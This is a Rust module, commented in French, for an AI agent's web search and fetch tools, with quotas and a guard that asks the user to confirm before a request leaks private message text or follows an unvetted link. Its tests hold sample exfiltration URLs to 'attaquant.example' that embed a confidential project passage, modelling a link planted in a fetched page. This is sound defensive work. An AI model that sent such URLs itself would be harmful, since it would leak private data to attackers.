//! Outils du domaine `web` exécutés par le worker (L15-web ; docs/plan/10 §4.2 à §4.4, catalogue L14 §8) :
//! `web_search` et `web_fetch`, par le **proxy `web`** du superviseur (`/run/synco/web.sock`, HTTP/1.1
//! clair), seul chemin du worker vers le web.
//!
//! | Étape | Où |
//! |---|---|
//! | arguments, quotas par tour et par conversation (comptés dans le transcript) | ici, avant tout envoi |
//! | **garde de fuite** et **provenance** (PC93) : confirmation, jamais de réécriture | [`guard`], avant tout envoi |
//! | SSRF, en-têtes, types, tailles, délais, quotas du runtime, clé du service | superviseur (`web_proxy.rs`) |
//! | conversion HTML → texte (dans le bac à sable), plafond `maxChars` | [`html`] |
//!
//! Le texte d'un message déchiffré ne part jamais vers le proxy sans confirmation : la garde compare
//! chaque requête et chaque URL aux textes de tiers lus par les outils de la conversation, aux jetons
//! rares qu'ils contiennent et aux noms des membres.

pub mod guard;
pub mod html;

use std::collections::HashSet;
use std::path::Path;
use std::time::Duration;

use bytes::Bytes;
use http_body_util::{BodyExt as _, Full, Limited};
use hyper_util::rt::TokioIo;
use serde_json::{Value, json};

use super::{Outcome, ToolCtx};
use crate::transcript::{Message, Role, ToolStatus};

/// `web_search`.
pub const WEB_SEARCH: &str = "web_search";
/// `web_fetch`.
pub const WEB_FETCH: &str = "web_fetch";

/// Noms des outils `client` de ce domaine que le worker sait exécuter.
pub const HANDLED: [&str; 2] = [WEB_SEARCH, WEB_FETCH];

/// Nom du socket du proxy, à côté de `llm.sock` (même répertoire, monté sous `/run/synco/`).
pub const WEB_SOCKET_NAME: &str = "web.sock";

/// Quotas du worker (09 §4.2), comptés dans le transcript.
pub const SEARCH_PER_TURN: usize = 10;
/// Recherches par conversation.
pub const SEARCH_PER_CONVERSATION: usize = 50;
/// Lectures par tour.
pub const FETCH_PER_TURN: usize = 20;
/// Lectures par conversation.
pub const FETCH_PER_CONVERSATION: usize = 100;
/// Texte rendu au modèle par défaut.
pub const DEFAULT_MAX_CHARS: usize = 20_000;
/// Texte rendu au modèle au plus.
pub const MAX_CHARS: usize = 100_000;
/// Octets demandés au proxy (2 Mio).
pub const MAX_FETCH_BYTES: usize = 2 * 1024 * 1024;
/// Délai d'une requête au proxy (au-delà de ses propres délais de 10 s et 20 s).
const CALL_TIMEOUT: Duration = Duration::from_secs(30);
/// Réponse de recherche lue au plus (le proxy en rend 8 Kio).
const SEARCH_BODY_MAX: usize = 64 * 1024;

/// Code rendu au modèle quand l'utilisateur refuse d'envoyer (10 §4.4).
pub const REFUSED_BY_USER: &str = "web_refused_by_user";
/// Proxy absent, fermé ou révoqué.
pub const UNAVAILABLE: &str = "web_unavailable";

/// L'outil est-il un outil web ?
#[must_use]
pub fn is_web_tool(name: &str) -> bool {
    HANDLED.contains(&name)
}

/// Exécution par le chemin générique des domaines : jamais utilisée par l'agent (qui passe par
/// [`execute`] avec le socket du proxy). Repli prudent : refus.
pub async fn run(_ctx: &ToolCtx<'_>, name: &str, _args: &Value) -> Option<Outcome> {
    is_web_tool(name).then(|| super::error(UNAVAILABLE))
}

// ---------------------------------------------------------------------------
// Arguments
// ---------------------------------------------------------------------------

/// Requête `web_search` validée.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SearchArgs {
    /// Texte exact envoyé (2 à 200 caractères).
    pub query: String,
    /// `day`, `week`, `month`, `year`.
    pub freshness: Option<String>,
    /// Code de langue à 2 lettres.
    pub lang: Option<String>,
    /// 1 à 10.
    pub count: Option<u64>,
}

/// Lecture `web_fetch` validée.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FetchArgs {
    /// URL analysée (`http` ou `https`).
    pub url: url::Url,
    /// Texte rendu au modèle.
    pub max_chars: usize,
}

/// Arguments de `web_search` (catalogue §3.13) ; `None` : invalides.
#[must_use]
pub fn search_args(args: &Value) -> Option<SearchArgs> {
    let query = args.get("query")?.as_str()?.trim().to_owned();
    let n = query.chars().count();
    if !(2..=200).contains(&n) {
        return None;
    }
    let freshness = match args.get("freshness") {
        None | Some(Value::Null) => None,
        Some(Value::String(f)) if matches!(f.as_str(), "day" | "week" | "month" | "year") => Some(f.clone()),
        Some(_) => return None,
    };
    let lang = match args.get("lang") {
        None | Some(Value::Null) => None,
        Some(Value::String(l)) if l.len() == 2 && l.bytes().all(|b| b.is_ascii_alphabetic()) => {
            Some(l.to_ascii_lowercase())
        }
        Some(_) => return None,
    };
    let count = match args.get("count") {
        None | Some(Value::Null) => None,
        Some(v) => Some(v.as_u64().filter(|c| (1..=10).contains(c))?),
    };
    Some(SearchArgs { query, freshness, lang, count })
}

/// Arguments de `web_fetch` ; `None` : invalides (schéma autre que `http`/`https`, URL trop longue).
#[must_use]
pub fn fetch_args(args: &Value) -> Option<FetchArgs> {
    let raw = args.get("url")?.as_str()?.trim();
    if raw.is_empty() || raw.len() > 2000 {
        return None;
    }
    let url = url::Url::parse(raw).ok().filter(|u| matches!(u.scheme(), "http" | "https"))?;
    let max_chars = match args.get("maxChars") {
        None | Some(Value::Null) => DEFAULT_MAX_CHARS,
        Some(v) => usize::try_from(v.as_u64().filter(|c| (1000..=100_000).contains(c))?).ok()?,
    };
    Some(FetchArgs { url, max_chars })
}

// ---------------------------------------------------------------------------
// Ce que le transcript apprend à la garde
// ---------------------------------------------------------------------------

/// Ce que le worker reconstruit du transcript avant chaque appel web (10 §4.4).
#[derive(Debug, Default)]
pub struct History {
    /// URL canoniques rendues par `web_search` dans cette conversation.
    pub search_urls: HashSet<String>,
    /// URL canoniques écrites par l'utilisateur dans ses messages.
    pub user_urls: HashSet<String>,
    /// Recherches et lectures déjà faites depuis le dernier message de l'utilisateur.
    pub turn_searches: usize,
    /// Lectures du tour.
    pub turn_fetches: usize,
    /// Recherches de la conversation.
    pub conv_searches: usize,
    /// Lectures de la conversation.
    pub conv_fetches: usize,
}

/// Une source `untrusted` qui n'est pas du web : texte de tiers lu par un outil (message, fichier,
/// ticket, tâche…). Le résultat d'une recherche ou d'une page n'alimente pas la garde (le web n'est
/// pas un secret de l'org).
#[must_use]
pub fn feeds_guard(untrusted: Option<&str>) -> bool {
    untrusted.is_some_and(|s| !s.starts_with("web"))
}

/// Chaînes d'un résultat d'outil (bornées), pour la garde.
fn strings_of(v: &Value, out: &mut Vec<String>, budget: &mut usize) {
    if *budget == 0 {
        return;
    }
    match v {
        Value::String(s) => {
            *budget = budget.saturating_sub(1);
            out.push(s.clone());
        }
        Value::Array(a) => a.iter().for_each(|x| strings_of(x, out, budget)),
        Value::Object(o) => o.values().for_each(|x| strings_of(x, out, budget)),
        _ => {}
    }
}

/// Reconstruit l'historique web et alimente `g` avec les textes de tiers lus (`untrusted_of(name)` :
/// étiquette `untrusted` de l'outil, depuis le manifeste). `current` : appel en cours, non compté.
pub fn scan(
    messages: &[Message],
    current: &str,
    untrusted_of: impl Fn(&str) -> Option<String>,
    g: &mut guard::Guard,
) -> History {
    let mut h = History::default();
    let last_user = messages.iter().rposition(|m| m.role == Role::User);
    let mut names = std::collections::HashMap::new();
    for (i, m) in messages.iter().enumerate() {
        let in_turn = last_user.is_none_or(|u| i > u);
        if m.role == Role::User
            && let Some(c) = &m.content
        {
            h.user_urls.extend(guard::urls_written(c));
        }
        for tc in &m.tool_calls {
            names.insert(tc.id.clone(), tc.name.clone());
            if tc.id == current || tc.status == ToolStatus::Rejected {
                continue;
            }
            let (turn, conv) = match tc.name.as_str() {
                WEB_SEARCH => (&mut h.turn_searches, &mut h.conv_searches),
                WEB_FETCH => (&mut h.turn_fetches, &mut h.conv_fetches),
                _ => continue,
            };
            *conv = conv.saturating_add(1);
            if in_turn {
                *turn = turn.saturating_add(1);
            }
        }
        if m.role != Role::Tool {
            continue;
        }
        let Some(result) = &m.tool_result else { continue };
        let Some(name) = m.tool_call_id.as_ref().and_then(|id| names.get(id)) else { continue };
        if name == WEB_SEARCH {
            for r in result.get("results").and_then(Value::as_array).into_iter().flatten() {
                if let Some(c) = r.get("url").and_then(Value::as_str).and_then(guard::canonical) {
                    h.search_urls.insert(c);
                }
            }
        } else if feeds_guard(untrusted_of(name).as_deref()) {
            let mut texts = Vec::new();
            let mut budget = 10_000usize;
            strings_of(result, &mut texts, &mut budget);
            for t in texts {
                g.add_text(&t);
            }
        }
    }
    h
}

// ---------------------------------------------------------------------------
// Décision avant envoi
// ---------------------------------------------------------------------------

/// Décision avant tout envoi.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Precheck {
    /// Envoyer sans confirmation.
    Send,
    /// Demander à l'utilisateur, avec le texte exact (`display`) et les motifs.
    Confirm {
        /// Requête ou URL complète, telle qu'elle partirait.
        display: String,
        /// Motifs (ordre de 10 §4.4).
        reasons: Vec<&'static str>,
        /// Passages à souligner (UTF-16 dans `display`).
        spans: Vec<(usize, usize)>,
    },
    /// Refus immédiat (`{"error": code}`), rien n'est envoyé.
    Refuse(&'static str),
}

/// Garde de fuite, provenance et quotas du worker pour l'appel `name(args)`.
#[must_use]
pub fn precheck(name: &str, args: &Value, h: &History, g: &guard::Guard) -> Precheck {
    match name {
        WEB_SEARCH => {
            let Some(a) = search_args(args) else { return Precheck::Refuse("web_bad_request") };
            if h.turn_searches >= SEARCH_PER_TURN || h.conv_searches >= SEARCH_PER_CONVERSATION {
                return Precheck::Refuse("web_quota");
            }
            let r = g.check(&a.query);
            if r.is_clear() {
                Precheck::Send
            } else {
                Precheck::Confirm { display: a.query, reasons: r.reasons, spans: r.spans }
            }
        }
        WEB_FETCH => {
            let Some(a) = fetch_args(args) else { return Precheck::Refuse("web_url_refused") };
            if h.turn_fetches >= FETCH_PER_TURN || h.conv_fetches >= FETCH_PER_CONVERSATION {
                return Precheck::Refuse("web_quota");
            }
            let display = a.url.to_string();
            let canon = guard::canonical(&display).unwrap_or_default();
            let mut reasons: Vec<&'static str> = Vec::new();
            let mut spans = Vec::new();
            // Garde sur le chemin et la requête décodés ; les passages ne sont soulignés que si
            // l'URL n'avait rien d'encodé (positions alors identiques dans l'URL affichée).
            let checked = guard::fetch_guard_text(&a.url);
            let r = g.check(&checked);
            let prefix = display.find(a.url.path()).filter(|_| !display.contains('%'));
            if let Some(off) = prefix {
                let off16 = display.get(..off).map_or(0, |p| p.encode_utf16().count());
                spans.extend(r.spans.iter().map(|(s, e)| (s.saturating_add(off16), e.saturating_add(off16))));
            }
            reasons.extend(r.reasons.iter().copied().filter(|x| *x != guard::GUARD_SATURATED));
            if !h.search_urls.contains(&canon) && !h.user_urls.contains(&canon) {
                reasons.push(guard::URL_PROVENANCE);
            }
            if r.reasons.contains(&guard::GUARD_SATURATED) {
                reasons.push(guard::GUARD_SATURATED);
            }
            if reasons.is_empty() { Precheck::Send } else { Precheck::Confirm { display, reasons, spans } }
        }
        _ => Precheck::Refuse(UNAVAILABLE),
    }
}

/// Clair du champ `guard` (`JCS({ v: 1, reasons, spans })`, 10 §4.4) : clés triées, sans espace.
#[must_use]
pub fn guard_plaintext(reasons: &[&str], spans: &[(usize, usize)]) -> String {
    // `serde_json::Map` trie ses clés (pas de `preserve_order`) : sortie canonique pour ces entiers et chaînes ASCII.
    let spans: Vec<Value> = spans.iter().map(|(s, e)| json!({ "start": s, "end": e })).collect();
    json!({ "v": 1, "reasons": reasons, "spans": spans }).to_string()
}

// ---------------------------------------------------------------------------
// Appel du proxy
// ---------------------------------------------------------------------------

struct ProxyResponse {
    status: u16,
    content_type: String,
    final_url: Option<String>,
    body: Bytes,
}

async fn call(socket: &Path, path: &str, body: &Value, max: usize) -> Result<ProxyResponse, &'static str> {
    let request = hyper::Request::builder()
        .method("POST")
        .uri(path)
        .header("host", "web-proxy")
        .header("content-type", "application/json")
        .body(Full::new(Bytes::from(body.to_string())))
        .map_err(|_| "web_bad_request")?;
    let exchange = async {
        let stream = tokio::net::UnixStream::connect(socket).await.map_err(|_| UNAVAILABLE)?;
        let (mut sender, conn) =
            hyper::client::conn::http1::handshake(TokioIo::new(stream)).await.map_err(|_| UNAVAILABLE)?;
        let conn = tokio::spawn(async move {
            let _ = conn.await;
        });
        let result = async {
            let resp = sender.send_request(request).await.map_err(|_| UNAVAILABLE)?;
            let status = resp.status().as_u16();
            let header = |n: &str| resp.headers().get(n).and_then(|v| v.to_str().ok()).map(str::to_owned);
            let content_type = header("content-type").unwrap_or_default();
            let final_url = header("x-synco-final-url");
            let body = Limited::new(resp.into_body(), max).collect().await.map_err(|_| "web_too_large")?.to_bytes();
            Ok(ProxyResponse { status, content_type, final_url, body })
        }
        .await;
        conn.abort();
        result
    };
    tokio::time::timeout(CALL_TIMEOUT, exchange).await.map_err(|_| "web_timeout")?
}

/// Code d'erreur d'une réponse du proxy (`{"error":"web_…"}`), sinon `web_provider`.
fn proxy_error(r: &ProxyResponse) -> Outcome {
    let body: Value = serde_json::from_slice(&r.body).unwrap_or(Value::Null);
    let code = body.get("error").and_then(Value::as_str).filter(|c| c.starts_with("web_") && c.len() <= 40);
    let mut out = json!({ "error": code.unwrap_or("web_provider") });
    if let Some(s) = body.get("status").and_then(Value::as_u64) {
        crate::json_set(&mut out, "status", json!(s));
    }
    Outcome::Failed(out)
}

/// Exécute `web_search` ou `web_fetch` (contrôles du worker déjà faits, ou appel accepté par
/// l'utilisateur) par le proxy `socket`.
pub async fn execute(socket: Option<&Path>, name: &str, args: &Value) -> Outcome {
    let Some(socket) = socket else { return super::error(UNAVAILABLE) };
    match name {
        WEB_SEARCH => {
            let Some(a) = search_args(args) else { return super::error("web_bad_request") };
            let mut body = json!({ "query": a.query });
            if let Some(f) = &a.freshness {
                crate::json_set(&mut body, "freshness", json!(f));
            }
            if let Some(l) = &a.lang {
                crate::json_set(&mut body, "lang", json!(l));
            }
            if let Some(c) = a.count {
                crate::json_set(&mut body, "count", json!(c));
            }
            let r = match call(socket, "/search", &body, SEARCH_BODY_MAX).await {
                Ok(r) => r,
                Err(code) => return super::error(code),
            };
            if r.status != 200 {
                return proxy_error(&r);
            }
            let parsed: Value = serde_json::from_slice(&r.body).unwrap_or(Value::Null);
            let results: Vec<Value> = parsed
                .get("results")
                .and_then(Value::as_array)
                .into_iter()
                .flatten()
                .filter(|x| x.get("url").and_then(Value::as_str).and_then(guard::canonical).is_some())
                .take(10)
                .cloned()
                .collect();
            Outcome::Done(json!({ "query": a.query, "results": results }))
        }
        WEB_FETCH => {
            let Some(a) = fetch_args(args) else { return super::error("web_url_refused") };
            let body = json!({ "url": a.url.as_str(), "maxBytes": MAX_FETCH_BYTES });
            let r = match call(socket, "/fetch", &body, MAX_FETCH_BYTES.saturating_add(1)).await {
                Ok(r) => r,
                Err(code) => return super::error(code),
            };
            if r.status != 200 {
                return proxy_error(&r);
            }
            fetched(&a, &r)
        }
        _ => super::error(UNAVAILABLE),
    }
}

fn fetched(a: &FetchArgs, r: &ProxyResponse) -> Outcome {
    let ct = r.content_type.to_ascii_lowercase();
    let text = html::decode_body(&r.body, &ct);
    let final_url = r.final_url.clone().filter(|u| guard::canonical(u).is_some()).unwrap_or_else(|| a.url.to_string());
    let host = url::Url::parse(&final_url).ok().and_then(|u| u.host_str().map(str::to_owned)).unwrap_or_default();
    let (title, content) = if ct.starts_with("text/html") {
        let p = html::html_to_text(&text, a.max_chars.saturating_add(1));
        (p.title, p.text)
    } else {
        (None, html::plain_text(&text, a.max_chars.saturating_add(1)))
    };
    let truncated = content.chars().count() > a.max_chars;
    let content: String = content.chars().take(a.max_chars).collect();
    let mut out = json!({
        "url": final_url,
        "source": format!("web:{host}"),
        "contentType": ct.split(';').next().unwrap_or_default().trim(),
        "text": content,
        "truncated": truncated,
    });
    if let Some(t) = title {
        crate::json_set(&mut out, "title", json!(t));
    }
    Outcome::Done(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::transcript::ToolCall;

    fn tool_call(id: &str, name: &str, args: Value, status: ToolStatus) -> Message {
        let mut m = Message::new(format!("a-{id}"), Role::Assistant, String::new());
        m.tool_calls.push(ToolCall {
            id: id.into(),
            name: name.into(),
            arguments: args,
            category: "client".into(),
            mutating: false,
            status,
        });
        m
    }

    fn tool_result(id: &str, v: Value) -> Message {
        let mut m = Message::new(format!("t-{id}"), Role::Tool, String::new());
        m.tool_call_id = Some(id.into());
        m.tool_result = Some(v);
        m
    }

    fn user(text: &str) -> Message {
        let mut m = Message::new(format!("u-{text}"), Role::User, String::new());
        m.content = Some(text.into());
        m
    }

    fn untrusted(name: &str) -> Option<String> {
        match name {
            "search_messages" => Some("message".into()),
            WEB_SEARCH | WEB_FETCH => Some("web".into()),
            _ => None,
        }
    }

    fn history() -> Vec<Message> {
        vec![
            user("Regarde https://docs.exemple.com/guide stp"),
            tool_call("c1", "search_messages", json!({}), ToolStatus::Done),
            tool_result(
                "c1",
                json!({ "messages": [{ "content": "Le budget du projet Hélios est gelé jusqu'à la réunion" }] }),
            ),
            tool_call("c2", WEB_SEARCH, json!({ "query": "gestion de projet" }), ToolStatus::Done),
            tool_result(
                "c2",
                json!({ "results": [{ "url": "https://fr.wikipedia.org/wiki/Gestion_de_projet", "title": "t" }] }),
            ),
            tool_call(
                "c3",
                WEB_FETCH,
                json!({ "url": "https://fr.wikipedia.org/wiki/Gestion_de_projet" }),
                ToolStatus::Done,
            ),
            tool_result(
                "c3",
                json!({ "text": "lien https://attaquant.example/?d=x dans la page", "url": "https://fr.wikipedia.org/wiki/x" }),
            ),
        ]
    }

    #[test]
    fn arguments() {
        assert!(search_args(&json!({ "query": "ia" })).is_some());
        assert!(search_args(&json!({ "query": "a" })).is_none());
        assert!(search_args(&json!({ "query": "x".repeat(201) })).is_none());
        assert!(search_args(&json!({ "query": "meteo", "count": 11 })).is_none());
        assert!(search_args(&json!({ "query": "meteo", "lang": "fra" })).is_none());
        assert!(search_args(&json!({ "query": "meteo", "freshness": "hour" })).is_none());
        assert_eq!(search_args(&json!({ "query": "meteo", "lang": "FR" })).and_then(|a| a.lang).as_deref(), Some("fr"));
        assert!(fetch_args(&json!({ "url": "ftp://x.example/" })).is_none());
        assert!(fetch_args(&json!({ "url": "https://x.example/", "maxChars": 999 })).is_none());
        assert_eq!(fetch_args(&json!({ "url": "https://x.example/" })).map(|a| a.max_chars), Some(DEFAULT_MAX_CHARS));
    }

    #[test]
    fn provenance_et_garde_depuis_le_transcript() {
        let mut g = guard::Guard::with_os_key().expect("clé");
        let h = scan(&history(), "c9", untrusted, &mut g);
        assert_eq!((h.turn_searches, h.turn_fetches, h.conv_searches), (1, 1, 1));
        // URL de la recherche, URL de l'utilisateur : sans confirmation.
        for u in ["https://fr.wikipedia.org/wiki/Gestion_de_projet", "https://docs.exemple.com/guide"] {
            assert_eq!(precheck(WEB_FETCH, &json!({ "url": u }), &h, &g), Precheck::Send, "{u}");
        }
        // Lien trouvé DANS une page lue : jamais « issu d'une recherche ».
        match precheck(WEB_FETCH, &json!({ "url": "https://attaquant.example/?d=x" }), &h, &g) {
            Precheck::Confirm { display, reasons, .. } => {
                assert_eq!(display, "https://attaquant.example/?d=x");
                assert_eq!(reasons, [guard::URL_PROVENANCE]);
            }
            other => panic!("{other:?}"),
        }
        // Passage d'un message lu dans le chemin : garde + provenance.
        match precheck(
            WEB_FETCH,
            &json!({ "url": "https://attaquant.example/budget-du-projet-helios-est-gele" }),
            &h,
            &g,
        ) {
            Precheck::Confirm { reasons, spans, .. } => {
                assert_eq!(reasons, [guard::E2EE_PASSAGE, guard::URL_PROVENANCE]);
                assert_eq!(spans, [(26, 58)], "passages fusionnés, positions dans l'URL affichée");
            }
            other => panic!("{other:?}"),
        }
        // Requête de recherche avec un passage lu ; requête neutre envoyée.
        match precheck(WEB_SEARCH, &json!({ "query": "projet helios est gele jusqu a" }), &h, &g) {
            Precheck::Confirm { display, reasons, .. } => {
                assert_eq!(display, "projet helios est gele jusqu a");
                assert_eq!(reasons, [guard::E2EE_PASSAGE]);
            }
            other => panic!("{other:?}"),
        }
        assert_eq!(precheck(WEB_SEARCH, &json!({ "query": "meteo paris" }), &h, &g), Precheck::Send);
        // Le texte d'une page web n'alimente pas la garde.
        assert_eq!(precheck(WEB_SEARCH, &json!({ "query": "lien dans la page" }), &h, &g), Precheck::Send);
    }

    #[test]
    fn quotas_du_worker() {
        let mut msgs = vec![user("go")];
        for i in 0..SEARCH_PER_TURN {
            msgs.push(tool_call(&format!("s{i}"), WEB_SEARCH, json!({ "query": "x" }), ToolStatus::Done));
        }
        msgs.push(tool_call("r", WEB_SEARCH, json!({ "query": "x" }), ToolStatus::Rejected));
        let mut g = guard::Guard::with_os_key().expect("clé");
        let h = scan(&msgs, "now", untrusted, &mut g);
        assert_eq!(h.turn_searches, SEARCH_PER_TURN, "un refus de l'utilisateur ne compte pas");
        assert_eq!(precheck(WEB_SEARCH, &json!({ "query": "meteo" }), &h, &g), Precheck::Refuse("web_quota"));
        // Nouveau tour : seul le plafond de la conversation compte.
        msgs.push(user("encore"));
        let h = scan(&msgs, "now", untrusted, &mut g);
        assert_eq!((h.turn_searches, h.conv_searches), (0, SEARCH_PER_TURN));
        assert_eq!(precheck(WEB_SEARCH, &json!({ "query": "meteo" }), &h, &g), Precheck::Send);
    }

    #[test]
    fn clair_du_champ_guard() {
        assert_eq!(
            guard_plaintext(&["e2ee_passage", "member_name"], &[(0, 5), (8, 21)]),
            r#"{"reasons":["e2ee_passage","member_name"],"spans":[{"end":5,"start":0},{"end":21,"start":8}],"v":1}"#
        );
        assert_eq!(guard_plaintext(&["url_provenance"], &[]), r#"{"reasons":["url_provenance"],"spans":[],"v":1}"#);
    }

    #[test]
    fn page_convertie_et_bornee() {
        let a = fetch_args(&json!({ "url": "https://ex.example/a", "maxChars": 1000 })).expect("args");
        let r = ProxyResponse {
            status: 200,
            content_type: "text/html; charset=utf-8".into(),
            final_url: Some("https://www.ex.example/b".into()),
            body: Bytes::from(format!("<title>T</title><p>{}</p>", "mot ".repeat(1000))),
        };
        let Outcome::Done(v) = fetched(&a, &r) else { panic!("échec") };
        assert_eq!(v["url"], "https://www.ex.example/b");
        assert_eq!(v["source"], "web:www.ex.example");
        assert_eq!(v["title"], "T");
        assert_eq!(v["truncated"], true);
        assert_eq!(v["text"].as_str().map(|t| t.chars().count()), Some(1000));
    }
}
